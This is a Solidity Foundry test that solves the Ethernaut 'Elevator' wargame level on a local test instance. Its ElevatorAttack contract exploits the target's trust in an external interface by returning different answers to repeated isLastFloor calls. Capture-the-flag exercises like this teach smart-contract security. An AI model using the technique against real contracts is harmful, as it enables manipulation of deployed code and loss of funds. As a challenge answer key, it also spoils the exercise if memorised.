// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Elevator/Elevator.sol";
import "../src/Elevator/ElevatorFactory.sol";
import "../src/Ethernaut.sol";

contract ElevatorTest is Test {
    Ethernaut private _ethernaut;
    ElevatorFactory private _elevatorFactory;
    Elevator private _elevator;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_elevatorFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_elevatorFactory);
        _elevator = Elevator(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_elevator))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _elevatorFactory = new ElevatorFactory();
    }

    function testElevatorHack() public testWrapper {
        ElevatorAttack elevatorAttack = new ElevatorAttack(address(_elevator));
        elevatorAttack.setTop(1);
    }
}

contract ElevatorAttack {
    address public challengeAddress;
    uint256 public floor;

    constructor(address _challengeAddress) {
        challengeAddress = _challengeAddress;
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (_floor == floor) {
            return true;
        }
        floor = _floor;
        return false;
    }

    function setTop(uint256 top) public {
        Elevator(challengeAddress).goTo(top);
    }
}
